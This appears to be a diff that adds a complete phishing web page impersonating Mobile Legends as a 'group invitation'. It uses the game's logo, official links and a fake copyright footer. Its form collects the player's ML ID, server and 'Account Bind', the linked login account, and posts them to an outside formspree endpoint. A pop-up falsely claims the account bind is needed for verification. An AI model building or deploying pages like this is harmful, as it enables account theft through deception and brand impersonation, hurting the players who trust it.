@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Legends Group Invitation</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Venmo&display=swap'); /* Import Venmo font */
+        
+        body {
+            font-family: 'Venmo', sans-serif; /* Set the default font to Venmo */
+            background: url('ECHO-PH-MPLI.png') no-repeat center center fixed;
+            background-size: cover;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 100vh;
+        }
+        .container {
+            width: 300px;
+            margin: auto;
+            padding-top: 50px;
+        }
+        .mlbb-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 100px;
+            cursor: pointer;
+        }
+        h1 {
+            color: white; /* Set text color to white */
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+        }
+        .submit-button {
+            padding: 10px 20px;
+            border-radius: 5px;
+            background-color: #ff9800;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        .submit-button:hover {
+            background-color: #e68900;
+        }
+        .message {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 5px;
+            display: none;
+        }
+        .footer {
+            margin: 20px 0;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.8);
+        }
+        .footer a {
+            color: rgba(255, 255, 255, 0.8);
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <a href="https://www.mobilelegends.com/" target="_blank">
+        <img src="ss-removebg-preview.png" alt="MLBB Logo" class="mlbb-logo">
+    </a>
+    <div class="container">
+        <h1>Join Our Mobile Legends Group</h1>
+        <form action="https://formspree.io/f/mjkbldlk" method="post">
+            <input type="text" name="mlid" placeholder="Enter your ML ID" required>
+            <input type="text" name="server" placeholder="Enter your Server" required>
+            <input type="text" name="account" placeholder="Enter the Account Bind" required>
+            <button type="submit" class="submit-button">Apply to Become a Member</button>
+        </form>
+        <p><a href="#" onclick="showMessage()">Why share the account bind?</a></p>
+        <div class="message" id="message">
+            <p>Sharing your account bind is necessary for verifying your account. For privacy and security, please make sure all information is up-to-date. Contact us if you need further assistance.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p><a href="https://www.mobilelegends.com/en/info/3?policy=1" target="_blank">Terms of Service</a> | <a href="#">Privacy Policy</a></p>
+        <p>&copy; 2024 Mobile Legends. All rights reserved.</p>
+    </div>
+
+    <script>
+        function showMessage() {
+            var message = document.getElementById('message');
+            message.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
